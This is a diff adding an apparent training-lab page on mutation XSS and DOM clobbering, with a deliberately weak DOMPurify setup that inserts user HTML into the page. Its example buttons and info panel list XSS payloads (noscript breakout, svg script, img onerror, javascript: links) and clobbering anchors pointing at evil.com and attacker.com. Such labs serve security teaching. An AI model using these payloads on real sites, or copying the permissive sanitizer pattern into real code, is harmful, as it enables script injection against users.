@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab: Mutation XSS & DOM Clobbering</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.replit.com/agent/bootstrap-agent-dark-theme.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        .lab-container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 2rem;
+        }
+        
+        .lab-header {
+            background: linear-gradient(135deg, #8b5cf6, #06b6d4);
+            color: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        
+        .mutation-interface {
+            background: var(--bs-dark);
+            border: 1px solid var(--bs-border-color);
+            border-radius: 0.75rem;
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+        
+        .dom-display {
+            background: var(--bs-body-bg);
+            border: 1px solid var(--bs-border-color);
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            min-height: 300px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+        }
+        
+        .vulnerability-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+        
+        .clobbering-target {
+            background: var(--bs-dark);
+            border: 1px solid #8b5cf6;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .mutation-log {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <!-- Vulnerability Indicator -->
+    <div class="vulnerability-indicator">
+        <span class="badge bg-danger fs-6">
+            <i class="fas fa-dna me-2"></i>
+            Mutation Lab
+        </span>
+    </div>
+
+    <div class="lab-container">
+        <!-- Lab Header -->
+        <div class="lab-header">
+            <h1><i class="fas fa-dna me-3"></i>Mutation XSS & DOM Clobbering Lab</h1>
+            <p class="mb-0">Exploit DOM mutations and clobber global JavaScript variables</p>
+        </div>
+
+        <div class="row">
+            <!-- Input Interface -->
+            <div class="col-lg-6">
+                <div class="mutation-interface">
+                    <h3 class="text-white mb-4">
+                        <i class="fas fa-edit me-2"></i>
+                        Content Editor
+                    </h3>
+                    
+                    <form id="mutationForm" class="mb-4">
+                        <div class="mb-3">
+                            <label class="form-label text-white">HTML Content:</label>
+                            <textarea id="htmlInput" 
+                                      class="form-control" 
+                                      rows="6"
+                                      placeholder="Enter HTML content that will be sanitized and inserted..."></textarea>
+                            <div class="form-text text-warning">
+                                HTML will be processed by DOMPurify, but mutations might occur afterward
+                            </div>
+                        </div>
+
+                        <div class="btn-group w-100 mb-3">
+                            <button class="btn btn-primary flex-fill" type="submit">
+                                <i class="fas fa-play me-2"></i>Insert Content
+                            </button>
+                            <button class="btn btn-outline-warning" type="button" onclick="loadClobberingExample()">
+                                <i class="fas fa-bomb me-1"></i>DOM Clobber
+                            </button>
+                            <button class="btn btn-outline-info" type="button" onclick="loadMutationExample()">
+                                <i class="fas fa-dna me-1"></i>Mutation
+                            </button>
+                        </div>
+                    </form>
+
+                    <div class="clobbering-target">
+                        <h6 class="text-purple mb-2">
+                            <i class="fas fa-target me-2"></i>
+                            Clobbering Targets:
+                        </h6>
+                        <div class="row text-sm">
+                            <div class="col-6">
+                                <div id="globalVar1" class="text-muted">window.config: <span id="configValue">undefined</span></div>
+                                <div id="globalVar2" class="text-muted">document.domain: <span id="domainValue">undefined</span></div>
+                            </div>
+                            <div class="col-6">
+                                <div id="globalVar3" class="text-muted">window.auth: <span id="authValue">undefined</span></div>
+                                <div id="globalVar4" class="text-muted">document.defaultView: <span id="defaultViewValue">undefined</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Mutation Observer Log -->
+                <div class="mutation-log">
+                    <h6 class="text-info mb-2">
+                        <i class="fas fa-eye me-2"></i>Mutation Observer Log
+                    </h6>
+                    <div id="mutationLog">
+                        <div class="text-muted">Waiting for DOM mutations...</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- DOM Display -->
+            <div class="col-lg-6">
+                <div class="dom-display">
+                    <h4 class="text-primary mb-3">
+                        <i class="fas fa-code me-2"></i>
+                        Sanitized DOM Output
+                    </h4>
+                    
+                    <div id="domOutput">
+                        <div class="text-center text-muted py-4">
+                            <i class="fas fa-tree fa-3x mb-3"></i>
+                            <p>Insert HTML content to see the sanitized DOM structure</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- JavaScript Execution Area -->
+                <div class="mt-3 p-3 bg-dark rounded">
+                    <h6 class="text-warning mb-2">
+                        <i class="fas fa-cogs me-2"></i>JavaScript Execution Context
+                    </h6>
+                    <div class="d-flex justify-content-between text-sm">
+                        <button onclick="checkClobbering()" class="btn btn-outline-warning btn-sm">
+                            Check Clobbering
+                        </button>
+                        <button onclick="triggerMutation()" class="btn btn-outline-info btn-sm">
+                            Trigger Mutation
+                        </button>
+                        <button onclick="clearDOM()" class="btn btn-outline-secondary btn-sm">
+                            Clear DOM
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Lab Information -->
+        <div class="card mt-4">
+            <div class="card-header">
+                <h5 class="mb-0">
+                    <i class="fas fa-graduation-cap me-2"></i>
+                    Mutation XSS & DOM Clobbering Techniques
+                </h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6 class="text-primary">DOM Clobbering</h6>
+                        <ul class="list-unstyled small">
+                            <li><strong>Named Elements:</strong> &lt;a id="config" href="evil"&gt;</li>
+                            <li><strong>Form Clobbering:</strong> &lt;form name="auth"&gt;&lt;input name="token"&gt;</li>
+                            <li><strong>Iframe Clobbering:</strong> &lt;iframe name="parent" src="about:blank"&gt;</li>
+                            <li><strong>Image Clobbering:</strong> &lt;img name="console" id="log"&gt;</li>
+                        </ul>
+                        
+                        <h6 class="text-primary mt-3">Mutation XSS</h6>
+                        <ul class="list-unstyled small">
+                            <li><strong>Namespace Confusion:</strong> SVG/MathML contexts</li>
+                            <li><strong>Tag Confusion:</strong> &lt;noscript&gt; in different parsers</li>
+                            <li><strong>Attribute Mutation:</strong> href/src changes</li>
+                            <li><strong>Text Node Mutation:</strong> Script content changes</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6 class="text-primary">Advanced Payloads</h6>
+                        <div class="bg-dark p-3 rounded">
+                            <small class="text-warning d-block mb-2">DOM Clobbering:</small>
+                            <code class="text-light small">
+                                &lt;a id="config" href="//evil.com"&gt;<br>
+                                &lt;a id="config" name="apiUrl" href="//evil.com"&gt;
+                            </code>
+                            
+                            <small class="text-warning d-block mb-2 mt-3">Mutation XSS:</small>
+                            <code class="text-light small">
+                                &lt;svg&gt;&lt;foreignObject&gt;&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mglyph&gt;&lt;/mglyph&gt;&lt;/math&gt;&lt;/foreignObject&gt;&lt;/svg&gt;<br>
+                                &lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
+                            </code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Back to Dashboard -->
+        <div class="text-center mt-4">
+            <a href="/" class="btn btn-secondary">
+                <i class="fas fa-arrow-left me-2"></i>
+                Back to Dashboard
+            </a>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="modal fade" id="successModal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header bg-success text-white">
+                    <h5 class="modal-title">
+                        <i class="fas fa-dna me-2"></i>
+                        Mutation Attack Successful!
+                    </h5>
+                </div>
+                <div class="modal-body">
+                    <p>Outstanding! You've successfully executed a mutation XSS or DOM clobbering attack.</p>
+                    <p>These advanced techniques can bypass even sophisticated sanitizers and represent cutting-edge XSS research.</p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <a href="/" class="btn btn-primary">Return to Dashboard</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- DOMPurify for sanitization -->
+    <script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
+    
+    <script>
+        let challengeCompleted = false;
+        let mutationObserver;
+        let mutationCount = 0;
+        
+        // Initialize globals that can be clobbered
+        window.config = { apiUrl: 'https://api.example.com' };
+        window.auth = { token: 'secret123' };
+        
+        // Set up mutation observer
+        function initMutationObserver() {
+            const targetNode = document.getElementById('domOutput');
+            const config = { 
+                attributes: true, 
+                childList: true, 
+                subtree: true,
+                attributeOldValue: true,
+                characterData: true
+            };
+            
+            mutationObserver = new MutationObserver(function(mutationsList) {
+                for (let mutation of mutationsList) {
+                    logMutation(mutation);
+                    checkForMutationXSS(mutation);
+                }
+            });
+            
+            mutationObserver.observe(targetNode, config);
+        }
+        
+        function logMutation(mutation) {
+            mutationCount++;
+            const logDiv = document.getElementById('mutationLog');
+            const timestamp = new Date().toLocaleTimeString();
+            
+            let mutationInfo = `[${timestamp}] ${mutation.type}`;
+            if (mutation.type === 'childList') {
+                mutationInfo += ` - Added: ${mutation.addedNodes.length}, Removed: ${mutation.removedNodes.length}`;
+            } else if (mutation.type === 'attributes') {
+                mutationInfo += ` - ${mutation.attributeName}: ${mutation.oldValue} → ${mutation.target.getAttribute(mutation.attributeName)}`;
+            }
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'text-warning small';
+            logEntry.textContent = mutationInfo;
+            logDiv.appendChild(logEntry);
+            
+            // Keep only last 10 entries
+            while (logDiv.children.length > 11) { // +1 for header
+                logDiv.removeChild(logDiv.children[1]);
+            }
+            
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        function checkForMutationXSS(mutation) {
+            // Check for dangerous mutations that could lead to XSS
+            if (mutation.type === 'childList') {
+                mutation.addedNodes.forEach(node => {
+                    if (node.nodeType === Node.ELEMENT_NODE) {
+                        // Check for script elements
+                        if (node.tagName === 'SCRIPT' || node.querySelector('script')) {
+                            showSuccess('Mutation XSS detected: Script element added!');
+                        }
+                        
+                        // Check for dangerous event handlers
+                        const dangerousAttrs = ['onload', 'onerror', 'onclick', 'onmouseover'];
+                        dangerousAttrs.forEach(attr => {
+                            if (node.hasAttribute && node.hasAttribute(attr)) {
+                                showSuccess('Mutation XSS detected: Event handler mutation!');
+                            }
+                        });
+                    }
+                });
+            } else if (mutation.type === 'attributes') {
+                // Check for dangerous attribute mutations
+                const dangerousAttrs = ['src', 'href', 'onload', 'onerror'];
+                if (dangerousAttrs.includes(mutation.attributeName)) {
+                    const newValue = mutation.target.getAttribute(mutation.attributeName);
+                    if (newValue && (newValue.includes('javascript:') || newValue.includes('alert('))) {
+                        showSuccess('Mutation XSS detected: Dangerous attribute mutation!');
+                    }
+                }
+            }
+        }
+        
+        // Form submission handler
+        document.getElementById('mutationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const html = document.getElementById('htmlInput').value;
+            insertSanitizedHTML(html);
+        });
+        
+        function insertSanitizedHTML(html) {
+            const outputDiv = document.getElementById('domOutput');
+            
+            // Sanitize HTML using DOMPurify
+            const cleanHTML = DOMPurify.sanitize(html, {
+                ALLOW_TAGS: ['div', 'p', 'span', 'a', 'img', 'form', 'input', 'iframe', 'svg', 'math', 'mi', 'mglyph', 'foreignObject', 'noscript'],
+                ALLOW_ATTR: ['id', 'name', 'href', 'src', 'title', 'alt', 'class']
+            });
+            
+            outputDiv.innerHTML = `
+                <div class="border p-3 rounded">
+                    <h6 class="text-success mb-2">Sanitized Content:</h6>
+                    ${cleanHTML}
+                </div>
+                <div class="mt-3 p-2 bg-secondary rounded">
+                    <small class="text-light">Raw HTML: ${escapeHtml(cleanHTML)}</small>
+                </div>
+            `;
+            
+            // Check for DOM clobbering after insertion
+            setTimeout(checkClobbering, 100);
+            
+            // Simulate post-sanitization mutations that might occur in real applications
+            setTimeout(() => {
+                simulateFrameworkMutations();
+            }, 500);
+        }
+        
+        function simulateFrameworkMutations() {
+            // Simulate mutations that frameworks like Angular, React might perform
+            const elements = document.querySelectorAll('#domOutput a, #domOutput img, #domOutput input');
+            elements.forEach(el => {
+                if (el.hasAttribute('href') && el.getAttribute('href').startsWith('//')) {
+                    // Simulate URL completion
+                    el.setAttribute('href', 'https:' + el.getAttribute('href'));
+                }
+                
+                if (el.hasAttribute('src') && el.getAttribute('src').startsWith('//')) {
+                    el.setAttribute('src', 'https:' + el.getAttribute('src'));
+                }
+            });
+        }
+        
+        function checkClobbering() {
+            updateGlobalVarDisplay();
+            
+            // Check if important globals have been clobbered
+            let clobbered = false;
+            
+            if (typeof window.config !== 'object' || window.config.nodeType) {
+                clobbered = true;
+                showSuccess('DOM Clobbering detected: window.config clobbered!');
+            }
+            
+            if (typeof window.auth !== 'object' || window.auth.nodeType) {
+                clobbered = true;
+                showSuccess('DOM Clobbering detected: window.auth clobbered!');
+            }
+            
+            // Check document properties
+            if (document.domain && typeof document.domain === 'object') {
+                clobbered = true;
+                showSuccess('DOM Clobbering detected: document.domain clobbered!');
+            }
+            
+            return clobbered;
+        }
+        
+        function updateGlobalVarDisplay() {
+            document.getElementById('configValue').textContent = typeof window.config + (window.config && window.config.nodeType ? ' (DOM element!)' : '');
+            document.getElementById('authValue').textContent = typeof window.auth + (window.auth && window.auth.nodeType ? ' (DOM element!)' : '');
+            document.getElementById('domainValue').textContent = typeof document.domain + (document.domain && typeof document.domain === 'object' ? ' (Clobbered!)' : '');
+            document.getElementById('defaultViewValue').textContent = typeof document.defaultView;
+        }
+        
+        function loadClobberingExample() {
+            const examples = [
+                '<a id="config" href="//evil.com">Config</a>',
+                '<form name="auth"><input name="token" value="hijacked"></form>',
+                '<a id="config" name="apiUrl" href="//attacker.com/api">',
+                '<iframe name="parent" src="about:blank"></iframe>',
+                '<img name="console" id="log" src="x">',
+                '<a id="document" name="domain" href="evil.com">'
+            ];
+            
+            const example = examples[Math.floor(Math.random() * examples.length)];
+            document.getElementById('htmlInput').value = example;
+        }
+        
+        function loadMutationExample() {
+            const examples = [
+                '<svg><foreignObject><math><mi></mi><mglyph></mglyph></math></foreignObject></svg>',
+                '<noscript><p title="</noscript><script>alert(1)</script>">',
+                '<math><mi href="javascript:alert(1)">click</mi></math>',
+                '<svg><script>alert(1)</script></svg>',
+                '<div><img src="x" onerror="alert(1)"></div>'
+            ];
+            
+            const example = examples[Math.floor(Math.random() * examples.length)];
+            document.getElementById('htmlInput').value = example;
+        }
+        
+        function triggerMutation() {
+            // Manually trigger some mutations for demonstration
+            const outputDiv = document.getElementById('domOutput');
+            const testElement = document.createElement('div');
+            testElement.className = 'test-mutation';
+            testElement.textContent = 'Mutation test element';
+            outputDiv.appendChild(testElement);
+            
+            setTimeout(() => {
+                testElement.setAttribute('data-mutated', 'true');
+                setTimeout(() => {
+                    testElement.remove();
+                }, 500);
+            }, 500);
+        }
+        
+        function clearDOM() {
+            document.getElementById('domOutput').innerHTML = `
+                <div class="text-center text-muted py-4">
+                    <i class="fas fa-tree fa-3x mb-3"></i>
+                    <p>Insert HTML content to see the sanitized DOM structure</p>
+                </div>
+            `;
+            document.getElementById('htmlInput').value = '';
+            
+            // Reset globals
+            window.config = { apiUrl: 'https://api.example.com' };
+            window.auth = { token: 'secret123' };
+            updateGlobalVarDisplay();
+        }
+        
+        function showSuccess(message) {
+            if (!challengeCompleted) {
+                challengeCompleted = true;
+                
+                // Log the successful attack
+                fetch('/log', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'mutation_xss_success',
+                        challenge_id: 13,
+                        payload: document.getElementById('htmlInput').value,
+                        attack_type: message,
+                        lab_url: window.location.href,
+                        timestamp: new Date().toISOString()
+                    })
+                }).then(() => {
+                    setTimeout(() => {
+                        new bootstrap.Modal(document.getElementById('successModal')).show();
+                    }, 1000);
+                });
+            }
+        }
+        
+        function escapeHtml(text) {
+            const map = {
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#039;'
+            };
+            return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+        }
+        
+        // Initialize everything when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            initMutationObserver();
+            updateGlobalVarDisplay();
+        });
+    </script>
+</body>
+</html>
